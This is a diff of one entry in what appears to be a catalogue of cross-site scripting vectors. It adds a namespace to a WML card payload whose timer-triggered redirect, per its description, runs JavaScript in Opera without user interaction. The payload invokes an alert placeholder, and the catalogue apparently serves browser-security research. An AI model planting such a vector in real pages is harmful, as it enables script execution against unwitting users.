@@ -2171,7 +2171,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<card><onevent type="ontimer"><go href="%js_uri_alert%"/></onevent><timer value="1"/></card>',
+        'data'       : '<card xmlns:x="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="%js_uri_alert%"/></onevent><timer value="1"/></card>',
         'description': {
             'en' : 'Opera supports WML files - Wireless Markup Language. As soon as a file has the extension .wml Opera assumes it\'s a WML and renders it accordingly. With a timer event and a connected redirect it\'s possible to execute JavaScript without user interaction.', 
             'ja' : '',
